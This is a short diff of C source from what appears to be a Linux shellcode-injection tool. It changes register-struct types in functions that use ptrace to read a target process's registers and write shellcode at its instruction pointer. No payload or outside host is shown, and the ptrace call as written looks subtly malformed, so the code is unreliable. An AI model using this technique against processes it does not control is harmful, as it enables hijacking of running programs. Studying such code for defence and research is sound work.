@@ -26,8 +26,8 @@ int detach_target_process(pid_t processId){
     return 0;
 }
 
-struct Registers get_target_process_registers(pid_t processId){
-    struct Registers targetProcessRegisters;
+struct user_regs_struct get_target_process_registers(pid_t processId){
+    struct user_regs_struct  targetProcessRegisters;
     printf("[+] Getting target process registers\n");
     int syscallReturnCode = ptrace(PTRACE_GETREGS, processId, &targetProcessRegisters); 
     if (syscallReturnCode < 0){
@@ -36,7 +36,7 @@ struct Registers get_target_process_registers(pid_t processId){
     return targetProcessRegisters;
 }
 
-int inject_shellcode(pid_t targetProcessId, struct Registers targetProcessRegisters, char* shellCode){
+int inject_shellcode(pid_t targetProcessId, struct user_regs_struct targetProcessRegisters, char* shellCode){
     void* targetProcessInstructionPointer = (void*) targetProcessRegisters.rip;
     printf("[+] Injecting shellcode to the target process RIP register: %p\n", targetProcessRegisters.rip);
     uint32_t *shellCodeStartAddress = (uint32_t *) shellCode;
